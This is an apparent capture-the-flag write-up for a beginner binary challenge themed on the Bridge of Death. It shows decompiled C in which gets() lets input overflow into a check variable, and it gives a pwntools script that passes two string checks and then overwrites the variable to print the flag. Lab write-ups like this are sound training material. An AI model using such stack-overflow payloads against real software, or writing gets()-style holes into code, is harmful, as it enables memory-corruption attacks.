This challenge is pretty much the same as the last one, the only step-up in difficulty is needing to input some strings the application is checking for, before sending our exploit.

```
undefined4 main(void)
{
  int isInputCorrect;
  char input [43];
  uint valueToChange;
  
  setvbuf(stdout,(char *)0x2,0,0);
  valueToChange = 0;
  puts(
      "Stop! Who would cross the Bridge of Death must answer me these questions three, ere the other  side he see."
      );
  puts("What... is your name?");
  fgets(input,0x2b,stdin);
  isInputCorrect = strcmp(input,"Sir Lancelot of Camelot\n");
  if (isInputCorrect != 0) {
    puts("I don\'t know that! Auuuuuuuugh!");
                    /* WARNING: Subroutine does not return */
    exit(0);
  }
  puts("What... is your quest?");
  fgets(input,0x2b,stdin);
  isInputCorrect = strcmp(input,"To seek the Holy Grail.\n");
  if (isInputCorrect != 0) {
    puts("I don\'t know that! Auuuuuuuugh!");
                    /* WARNING: Subroutine does not return */
    exit(0);
  }
  puts("What... is my secret?");
  gets(input);
  if (valueToChange == 0xdea110c8) {
    print_flag();
  }
  else {
    puts("I don\'t know that! Auuuuuuuugh!");
  }
  return 0;
}
```

We can see that the application reads our input twice using `fgets` and setting a limit for our input, protecting itself from a buffer overflow. But the third time it asks for our input, besides not comparing it against anything (weird in the context of the application), it uses the `gets` function and therefore is vulnerable to a buffer overflow, so we only have to figure out how many bytes we have to write until we overflow into `valueToChange`.

(When writing this, I saw that the application kinda just tells you how many bytes you can write before overflowing, but at the time of solving I didn't catch it , `fgets(input,0x2b,stdin)` tells us exactly how much we can write before overflowing, but when reading I honestly assumed that it was just some safe value, and not literally the bounds of the buffer :/ )

```
undefined4 __cdecl main(void)
 undefined4        EAX:4          <RETURN>
 undefined4        EAX:4          isInputCorrect
 undefined4        Stack[0x0]:4   local_res0
 undefined1        Stack[-0x10]:1 local_10
 undefined4        Stack[-0x14]:4 local_14
 uint              Stack[-0x18]:4 valueToChange
 undefined1[43]    Stack[-0x43]   input
```

Looking at the stack, we can see that we need to write `0x43 - 0x18` bytes to fully fill the input buffer and start overflowing into `valueToChange`, so I quickly wrote this script to exploit this binary.

```
from pwn import *

pwn1 = process('./pwn1')
payload = b"A"* (0x43 - 0x18) +  p32(0xdea110c8)

pwn1.send("Sir Lancelot of Camelot\n")
pwn1.send("To seek the Holy Grail.\n")
pwn1.sendline(payload)

pwn1.interactive()
```

While this challenge didn't really teach me much after the last one, it was indeed useful in practicing what we learned and making me a better hacker.